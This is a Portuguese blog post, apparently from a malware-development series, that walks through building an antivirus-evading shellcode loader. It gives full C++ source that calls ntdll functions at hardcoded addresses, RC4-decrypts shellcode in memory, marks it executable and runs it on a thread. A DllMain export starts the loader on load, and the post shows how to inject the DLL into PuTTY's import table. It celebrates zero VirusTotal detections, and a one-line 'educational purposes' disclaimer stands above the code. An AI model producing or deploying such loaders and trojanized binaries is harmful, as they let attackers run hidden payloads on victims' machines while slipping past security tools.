---
weight: 9
title: "Post IX: Zero no VirusTotal"
date: 2024-09-13T15:58:26+08:00
lastmod: 2024-09-13T15:58:26+08:00
draft: false
author: Vith0r
authorLink: https://github.com/Vith0r
description: Reverse Shell Simples.
images: 
resources:
  - name: featured-image
    src: Image.jpeg
tags:
  - Malware
categories:
  - Malware
lightgallery: true
toc:
  auto: false
---

Bom, acredito que um dos objetivos ao criar um malware é que seu arquivo não seja detectado, por exemplo, no `VirusTotal`. No entanto, como esse processo pode ser bastante complicado, muitas vezes é difícil alcançar essa meta. No post de hoje, decidi criar um loader que não seja detectado por nenhum antivírus ao ser enviado para o `VirusTotal`.

## Syscalls indiretas ou Diretas

> [!warning] Warning
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.

Syscalls podem ser chamadas de duas formas: `direta e indireta`. As chamadas diretas acessam funções do kernel diretamente usando números de syscall, enquanto as indiretas utilizam funções intermediárias para realizar as chamadas.<br> Abaixo deixei 2 exemplos para melhor entendimento:

![](https://telegra.ph/file/db264b99dda666532b98d.png)

![](https://telegra.ph/file/4d8fb25cc244a8274caaa.png)

Mas vamos fazer isso de uma maneira diferente. Vocês vão ver ao longo do post e entender do que estou falando.
## Código

```cpp
#include <windows.h>
#include <iostream>

// Definições necessárias para a API não documentada do Windows
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = r;                         \
    (p)->Attributes = a;                            \
    (p)->ObjectName = n;                            \
    (p)->SecurityDescriptor = s;                    \
    (p)->SecurityQualityOfService = NULL;           \
}

// Definição dos ponteiros de função
typedef NTSTATUS(NTAPI* NtOpenProcess_t)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
    );

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

typedef NTSTATUS(NTAPI* NtWaitForSingleObject_t)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
    );

typedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

typedef NTSTATUS(NTAPI* NtClose_t)(
    HANDLE Handle
    );

// Endereços
constexpr uintptr_t addr_NtOpenProcess = 0x00007FFC4962DA10;
constexpr uintptr_t addr_NtAllocateVirtualMemory = 0x00007FFC4962D850;
constexpr uintptr_t addr_NtWriteVirtualMemory = 0x00007FFC4962DC90;
constexpr uintptr_t addr_NtProtectVirtualMemory = 0x00007FFC4962DF50;
constexpr uintptr_t addr_NtCreateThreadEx = 0x00007FFC4962ED80;
constexpr uintptr_t addr_NtWaitForSingleObject = 0x00007FFC4962D5D0;
constexpr uintptr_t addr_NtFreeVirtualMemory = 0x00007FFC4962D910;
constexpr uintptr_t addr_NtClose = 0x00007FFC4962D730;

// Convertendo endereços para funções
NtOpenProcess_t NtOpenProcess = reinterpret_cast<NtOpenProcess_t>(addr_NtOpenProcess);
NtAllocateVirtualMemory_t NtAllocateVirtualMemory = reinterpret_cast<NtAllocateVirtualMemory_t>(addr_NtAllocateVirtualMemory);
NtWriteVirtualMemory_t NtWriteVirtualMemory = reinterpret_cast<NtWriteVirtualMemory_t>(addr_NtWriteVirtualMemory);
NtProtectVirtualMemory_t NtProtectVirtualMemory = reinterpret_cast<NtProtectVirtualMemory_t>(addr_NtProtectVirtualMemory);
NtCreateThreadEx_t NtCreateThreadEx = reinterpret_cast<NtCreateThreadEx_t>(addr_NtCreateThreadEx);
NtWaitForSingleObject_t NtWaitForSingleObject = reinterpret_cast<NtWaitForSingleObject_t>(addr_NtWaitForSingleObject);
NtFreeVirtualMemory_t NtFreeVirtualMemory = reinterpret_cast<NtFreeVirtualMemory_t>(addr_NtFreeVirtualMemory);
NtClose_t NtClose = reinterpret_cast<NtClose_t>(addr_NtClose);

typedef struct _USTRING {
    ULONG Length;
    ULONG MaximumLength;
    PWSTR Buffer;
} USTRING;

typedef LONG NTSTATUS;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    USTRING* Img,
    USTRING* Key
    );

BOOL RC4DEC(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
    NTSTATUS STATUS;
    USTRING Key = { dwRc4KeySize, dwRc4KeySize, reinterpret_cast<PWSTR>(pRc4Key) };
    USTRING Img = { sPayloadSize, sPayloadSize, reinterpret_cast<PWSTR>(pPayloadData) };
    char a_dll_name[] = "Advapi32.dll";
    char NotSysFunc32[] = "SystemFunction032";
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(a_dll_name), NotSysFunc32);

    STATUS = SystemFunction032(&Img, &Key);
    if (STATUS != 0x0) {
        return FALSE;
    }
    return TRUE;
}

int main() {
    HANDLE processHandle;
    CLIENT_ID clientId;
    clientId.UniqueProcess = reinterpret_cast<HANDLE>(GetCurrentProcessId());
    clientId.UniqueThread = 0;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
    if (status != 0) {
        std::cerr << "NtOpenProcess failed: " << std::hex << status << std::endl;
        return 1;
    }

    PVOID baseAddress = NULL;
    SIZE_T regionSize = 1;
    status = NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        std::cerr << "NtAllocateVirtualMemory failed: " << std::hex << status << std::endl;
        NtClose(processHandle);
        return 1;
    }

    unsigned char shellcode[] = {
    0x00, 0x00, 0x0, 0x00, 0x00, 0x00, 0x00, 0x00

    };

    unsigned char Key[] = {
    0x00, 0x00, 0x0, 0x00, 0x00, 0x00, 0x00, 0x00
    };



	DWORD SIZEKEY = sizeof(Key);
    DWORD SIZEPAY = sizeof(shellcode);

    SIZE_T writtenBytes = 0;
    status = NtWriteVirtualMemory(processHandle, baseAddress, shellcode, sizeof(shellcode), &writtenBytes);
    if (status != 0) {
        std::cerr << "NtWriteVirtualMemory failed: " << std::hex << status << std::endl;
        NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, MEM_RELEASE);
        NtClose(processHandle);
        return 1;
    }

	BOOL DECRYPT = RC4DEC(Key, static_cast<PBYTE>(baseAddress), SIZEKEY, SIZEPAY);

    ULONG oldProtect = 0;
    status = NtProtectVirtualMemory(processHandle, &baseAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        std::cerr << "NtProtectVirtualMemory failed: " << std::hex << status << std::endl;
        NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, MEM_RELEASE);
        NtClose(processHandle);
        return 1;
    }

    HANDLE threadHandle;
    status = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, processHandle, baseAddress, NULL, 0, 0, 0, 0, NULL);
    if (status != 0) {
        std::cerr << "NtCreateThreadEx failed: " << std::hex << status << std::endl;
        NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, MEM_RELEASE);
        NtClose(processHandle);
        return 1;
    }

    status = NtWaitForSingleObject(threadHandle, FALSE, NULL);
    if (status != 0) {
        std::cerr << "NtWaitForSingleObject failed: " << std::hex << status << std::endl;
    }

    NtClose(threadHandle);
    NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, MEM_RELEASE);
    NtClose(processHandle);

    return 0;
}

#ifdef _WINDLL

extern "C" __declspec(dllexport) bool __stdcall DllMain(HINSTANCE H_instance, unsigned long rsn) {

    DisableThreadLibraryCalls(H_instance);
    switch (rsn)
    {
    case DLL_PROCESS_ATTACH:
    {
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)main, 0, 0, 0);
    } break;

    }

    return true;
}
#endif

```
## Explicando brevemente algumas partes do código

Começamos definindo várias estruturas necessárias para interagir com as APIs não documentadas do Windows, como `CLIENT_ID`, `UNICODE_STRING` e `OBJECT_ATTRIBUTES`.

```cpp

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = r;                         \
    (p)->Attributes = a;                            \
    (p)->ObjectName = n;                            \
    (p)->SecurityDescriptor = s;                    \
    (p)->SecurityQualityOfService = NULL;           \
}

```

Depois definimos os tipos de função para cada api que será usada no código.

```cpp
typedef NTSTATUS(NTAPI* NtOpenProcess_t)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
    );
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );
// Definições semelhantes para NtWriteVirtualMemory, NtProtectVirtualMemory, etc.

```

Depois definimos os endereços das APIs como constantes:

```cpp

constexpr uintptr_t addr_NtOpenProcess = 0x00007FFC4962DA10;
// Definições semelhantes para outras APIs...
}
```

Depois os endereços serão convertidos para ponteiros de função.

```cpp
NtOpenProcess_t NtOpenProcess = reinterpret_cast<NtOpenProcess_t>(addr_NtOpenProcess);
// Conversões semelhantes para outras APIs...

```

Então para não fornecer o shellcode puro no código criptografamos a nossa shellcode com RC4 usamos a boa e velha Função de Decriptação RC4:

```cpp
BOOL RC4DEC(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
    NTSTATUS STATUS;
    USTRING Key = { dwRc4KeySize, dwRc4KeySize, reinterpret_cast<PWSTR>(pRc4Key) };
    USTRING Img = { sPayloadSize, sPayloadSize, reinterpret_cast<PWSTR>(pPayloadData) };
    char a_dll_name[] = "Advapi32.dll";
    char NotSysFunc32[] = "SystemFunction032";
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(a_dll_name), NotSysFunc32);

    STATUS = SystemFunction032(&Img, &Key);
    if (STATUS != 0x0) {
        return FALSE;
    }
    return TRUE;
}
```

E a nossa função `main` faz o classico ela Abre o processo atual usando `NtOpenProcess`, Aloca memória no processo com `NtAllocateVirtualMemory`, Escreve o shellcode criptografado na memória alocada com `NtWriteVirtualMemory` e descriptografa usando o `RC4DEC`, Então protege a memória para execução com `NtProtectVirtualMemory`, Cria um thread para executar o shellcode usando `NtCreateThreadEx`, Espera pelo término do thread com `NtWaitForSingleObject`, Libera a memória alocada com `NtFreeVirtualMemory`, Fecha o handle do processo com `NtClose`.

```cpp
int main() {
    HANDLE processHandle;
    CLIENT_ID clientId;
    clientId.UniqueProcess = reinterpret_cast<HANDLE>(GetCurrentProcessId());
    clientId.UniqueThread = 0;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
    if (status != 0) {
        std::cerr << "NtOpenProcess failed: " << std::hex << status << std::endl;
        return 1;
    }

    PVOID baseAddress = NULL;
    SIZE_T regionSize = 1;
    status = NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        std::cerr << "NtAllocateVirtualMemory failed: " << std::hex << status << std::endl;
        NtClose(processHandle);
        return 1;
    }

}
```

Depois, por fim, declaramos uma exportação que cria uma thread para nossa `main`.

```cpp
#ifdef _WINDLL

extern "C" __declspec(dllexport) bool __stdcall DllMain(HINSTANCE H_instance, unsigned long rsn) {

    DisableThreadLibraryCalls(H_instance);
    switch (rsn)
    {
    case DLL_PROCESS_ATTACH:
    {
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)main, 0, 0, 0);
    } break;

    }

    return true;
}
#endif
}
```

---
### Adicionando metadados
Eu decidi adicionar metadados:

![](https://telegra.ph/file/affb9f4604bb55cea8889.png)

---
### Endereços das APIs
Para pegar os endereços das APIs apenas utilizei o `x64dbg` e anexei o `notepad.exe` no `x64dbg` fui em `Simbolos` filtrei pela `ntdll` e pesquisei pelas APIs que utilizei no código como `NtOpenProcess` e copiei o endereço, abaixo uma imagem para melhor entendimento:

![](https://telegra.ph/file/7e334a8d6da0ea83d03df.png)

---
### Infectando nosso executável
Como declaramos uma exportação no nosso código, agora temos apenas que fazer um executável carregar nossa DLL. Para isso, vou utilizar o `CFF-EXPLORER`. Neste exemplo, vou usar o `putty`. Então, apenas arrastamos o executável do `putty` para o `CFF-EXPLORER`, vamos para `Import Adder`, depois adicionamos nossa DLL, clicamos em `Import By Ordinal`, clicamos em `Create New Section` e, por fim, clicamos em `Rebuild Import Table`. Finalmente, salvamos nosso `putty` modificado.

![](https://telegra.ph/file/1a2ec2ab015b772137108.png)

---
### Testando nosso loader
Então, depois de colocar todos os endereços, podemos testar. Para isso, podemos tanto definir BreakPoints no `x64dbg` quanto verificar a pilha de threads pelo `ProcessHacker`. Abaixo faço essas verificações:

![](https://telegra.ph/file/2db0880174b68a8d81a5d.png)

---
### Loader Simples
Um loader que não faz uso de APIs NT agiria dessa forma:

![](https://telegra.ph/file/bbeeb6aaebc666ddb0d68.png)

---
### Testando nosso loader
Bom, terminamos todas as etapas do nosso loader. Agora, basta testar para ver se ele executa de fato nossa shellcode. Estou usando a mesma shellcode que criei no post anterior.

![](https://telegra.ph/file/6d5a3b3126d45d5d58722.png)

---
### FUD?
Bom como podemos ver nosso loader funcionou perfeitamente agora basta jogar no `VirusTotal` e ver quanto vai ser detectado:

![](https://telegra.ph/file/7412e35fa2075ab25352c.png)

Pronto, nosso loader está 100% indetectável no `VirusTotal`. No entanto, é importante lembrar que, embora esteja indetectável no `VirusTotal`, isso não significa que o "malware" não será detectado por um antivírus (AV) ou sistema de detecção e resposta de endpoint (EDR), pois são coisas diferentes. Então é isso, tchau tchau!